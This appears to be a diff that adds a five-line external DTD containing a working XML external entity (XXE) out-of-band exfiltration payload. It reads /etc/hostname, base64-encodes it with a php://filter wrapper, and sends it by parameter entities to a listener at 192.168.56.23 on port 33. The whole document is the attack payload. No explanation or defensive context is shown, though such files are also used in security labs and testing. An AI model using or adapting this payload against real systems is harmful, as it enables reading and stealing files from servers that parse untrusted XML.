@@ -1,0 +1,5 @@
+<!ENTITY % payload SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/hostname">
+<!ENTITY % remote
+"<!ENTITY &#37; send SYSTEM 'http://192.168.56.23:33/%payload;'>">
+%remote;
+%send;
